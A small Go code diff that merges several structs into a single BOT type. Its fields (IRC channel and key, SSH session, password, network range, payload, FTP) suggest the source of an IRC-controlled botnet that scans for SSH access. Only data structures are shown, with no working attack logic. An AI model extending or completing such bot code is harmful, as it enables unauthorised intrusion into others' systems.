@@ -6,16 +6,12 @@ import (
 	"golang.org/x/crypto/ssh"
 )
 
-type IRC struct {
-	Report           net.Conn
-	Channel, ChanKey string
-}
-
-type SCAN struct {
-	s_session        *ssh.Client
-	s_paswd, ipRange string
-}
-
-type INFO struct {
-	ncpu int
+type BOT struct {
+	cpu               int
+	payload           string
+	ftp               string
+	password, network string
+	Channel, ChanKey  string
+	IRC               net.Conn
+	session           *ssh.Client
 }
